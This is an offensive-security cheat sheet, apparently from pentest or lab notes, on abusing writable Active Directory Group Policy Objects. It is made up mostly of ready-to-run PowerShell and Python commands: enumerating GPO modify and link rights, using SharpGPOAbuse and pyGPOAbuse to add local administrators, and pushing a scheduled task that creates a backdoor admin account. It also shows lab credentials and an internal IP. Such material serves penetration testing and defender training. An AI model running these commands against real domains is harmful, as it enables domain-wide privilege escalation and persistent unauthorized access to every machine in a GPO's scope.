# 11.02 GPO Abuse

> Modify a writable GPO via `SharpGPOAbuse`/`pyGPOAbuse` to push local-admin, scheduled tasks, or logon scripts to every host in scope.

## Overview

GPO abuse exploits rights to modify, create, or link Group Policy Objects. An attacker with edit rights on a GPO can add local admins, run scheduled tasks, or configure logon scripts affecting all machines in the GPO's scope. Enumeration requires identifying which non-admin users can modify GPOs, where GPOs are linked, and who can link or create new GPOs. SharpGPOAbuse (Windows) and pyGPOAbuse (Linux) automate payload delivery via GPO modification.

## Steps

- Enumerate GPO names and GUIDs with Get-DomainGPO; find where they are linked (domain/site/OU) via gplink attribute.
- Find non-admin users with GPO modify rights: pipe Get-DomainGPO to Get-DomainObjectAcl filtering for CreateChild/WriteProperty/WriteDacl and RIDs > 1000.
- Find who can link GPOs to sites/domain/OUs with Get-DomainSite, Get-DomainObjectAcl (ObjectAceType -eq "GP-Link"), Get-DomainOU.
- Find who can create GPOs by querying CN=Policies,CN=System for CreateChild rights.
- Use Get-GPOEnumeration wrapper to automate all the above (-ModifyGPOs, -LinkGPOs, -CreateGPO flags).
- From Linux: use GPOwned.py -listgpo/-listgplink for enumeration; dacledit.py for DACL inspection per GPO GUID.
- Backup the target GPO before modification (GPOwned.py -backup).
- Windows: use SharpGPOAbuse --AddLocalAdmin or --AddComputerTask; Linux: use pyGPOAbuse -command.
- Create and link new GPOs with New-GPO + New-GPLink (requires RSAT GroupPolicy module).

## Commands

### List all GPO names

```powershell
Get-DomainGPO -Properties displayname
```

### Check domain-level gplink

```powershell
Get-DomainObject -SearchScope Base -Properties gplink
```

### Find non-admin users with GPO modify rights

```powershell
Get-DomainGPO | Select-Object -First 1 | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' }
```

### Find who can link GPOs to OUs

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List
```

### Find who can link GPOs to sites

```powershell
Get-DomainSite -Properties distinguishedname | foreach { Get-DomainObjectAcl -SearchBase $_.distinguishedname -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List }
```

### Find who can create GPOs

```powershell
$identity = (Get-DomainGPO).distinguishedname -replace 'CN=\{[A-F0-9-]+\},',''; Get-DomainObjectACL -Identity $identity -ResolveGUIDs | where { $_.ActiveDirectoryRights -contains "CreateChild" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' } | foreach { ConvertFrom-SID $_.SecurityIdentifier }
```

### List computers in each OU

```powershell
Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }
```

### Run GPO enumeration wrapper

```powershell
Import-Module .\Get-GPOEnumeration.ps1; Get-GPOEnumeration
```

### Add local admin via SharpGPOAbuse

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName "Default Security Policy - WKS"
```

### Create new GPO (RSAT module)

```powershell
New-GPO -Name TestGPO -Comment "This is a test GPO."
```

### Link GPO to OU

```powershell
New-GPLink -Name TestGPO -Target "OU=TestOU,DC=<DOMAIN>,DC=local"
```

### List GPOs (Linux GPOwned)

```bash
proxychains4 -q python3 GPOwned.py -u gabriel -p Godisgood001 -d <DOMAIN>.local -dc-ip 172.16.92.10 -gpcmachine -listgpo
```

### List GPO links (Linux GPOwned)

```bash
proxychains4 -q python3 GPOwned.py -u gabriel -p Godisgood001 -d <DOMAIN>.local -dc-ip 172.16.92.10 -gpcmachine -listgplink
```

### Backup GPO before modification

```bash
proxychains4 -q python3 GPOwned.py -u gabriel -p Godisgood001 -d <DOMAIN>.local -dc-ip 172.16.92.10 -gpcmachine -backup backupgpo -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"
```

### Check modify rights on GPO (dacledit Linux)

```bash
proxychains4 -q python3 examples/dacledit.py <DOMAIN>.local/gabriel:Godisgood001 -target-dn "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=<DOMAIN>,DC=local" -dc-ip 172.16.92.10
```

### Abuse GPO via pyGPOAbuse (add local admin)

```bash
proxychains4 -q python3 pygpoabuse.py <DOMAIN>.local/gabriel:Godisgood001 -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" -taskname "PT_LocalAdmin" -description "this is a GPO test" -dc-ip 172.16.92.10 -v
```
